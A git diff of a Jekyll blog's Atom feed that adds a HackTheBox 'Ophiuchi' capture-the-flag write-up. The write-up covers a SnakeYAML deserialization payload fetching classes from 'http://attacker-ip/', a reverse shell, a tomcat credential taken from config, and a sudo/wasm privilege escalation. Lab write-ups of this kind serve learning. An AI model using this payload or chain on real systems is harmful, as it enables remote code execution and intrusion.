@@ -1,4 +1,49 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-08-03T20:05:20+05:30</updated><id>/feed.xml</id><title type="html">Writeups</title><subtitle>Writeups by r3Z3l</subtitle><entry><title type="html">Script Kiddie Writeup</title><link href="/Script-Kiddie" rel="alternate" type="text/html" title="Script Kiddie Writeup" /><published>2021-07-02T01:30:00+05:30</published><updated>2021-07-02T01:30:00+05:30</updated><id>/Script-Kiddie</id><content type="html" xml:base="/Script-Kiddie">&lt;p&gt;Easy Linux box from HackTheBox.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-08-04T13:18:59+05:30</updated><id>/feed.xml</id><title type="html">Writeups</title><subtitle>Writeups by r3Z3l</subtitle><entry><title type="html">Ophiuchi Writeup</title><link href="/Ophiuchi" rel="alternate" type="text/html" title="Ophiuchi Writeup" /><published>2021-07-02T01:30:00+05:30</published><updated>2021-07-02T01:30:00+05:30</updated><id>/Ophiuchi</id><content type="html" xml:base="/Ophiuchi">&lt;p&gt;Easy Linux box from HackTheBox.&lt;/p&gt;
+
+&lt;p&gt;On rustscan:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;port 22&lt;/li&gt;
+  &lt;li&gt;port 8080
+are open.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;checking port 8080 which hosting webpage allow yaml parsing.&lt;/p&gt;
+
+&lt;p&gt;I found article related to yaml parsing.
+&lt;a href=&quot;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&quot;&gt;https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+!!javax.script.ScriptEngineManager [
+		!!java.net.URLClassLoader [[
+			!!java.net.URL [&quot;http://attacker-ip/&quot;]
+		]]
+]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It request our python server for some files.
+we used this exploit to send reverse shell.
+&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;
+using this we get shell of tomcat.&lt;/p&gt;
+
+&lt;p&gt;It’s running on tomcat so let’s find it configuration.
+reading tomcat config file we get credentials
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:whythereisalimit&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;After doing ssh we are now admin user.
+we get #user-txt&lt;/p&gt;
+
+&lt;p&gt;after checking sudo -l.&lt;br /&gt;
+we find that we can run sudo with index.go without password.&lt;br /&gt;
+if we check file index.go we see that path is not properly specified completely for main.wasm and deploy.sh.
+&lt;img src=&quot;assets/images/Pasted image 20210609202714.png&quot; alt=&quot;Pasted image 20210609202714.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s create main.wasm which returns 1 as a value of info function
+using &lt;a href=&quot;https://mbebenita.github.io/WasmExplorer/&quot;&gt;https://mbebenita.github.io/WasmExplorer/&lt;/a&gt;
+&lt;img src=&quot;assets/images/Pasted image 20210609202957.png&quot; alt=&quot;Pasted image 20210609202957.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In deploy.sh let’s put a reverse shell.
+We got a reverse shell as a root user
+we got #root-txt&lt;/p&gt;</content><author><name>Himanshu Kumar</name></author><summary type="html">Easy Linux box from HackTheBox.</summary></entry><entry><title type="html">Script Kiddie Writeup</title><link href="/Script-Kiddie" rel="alternate" type="text/html" title="Script Kiddie Writeup" /><published>2021-07-02T01:30:00+05:30</published><updated>2021-07-02T01:30:00+05:30</updated><id>/Script-Kiddie</id><content type="html" xml:base="/Script-Kiddie">&lt;p&gt;Easy Linux box from HackTheBox.&lt;/p&gt;
 
 &lt;p&gt;Starting with port scanning.
 let’s use rustscan.
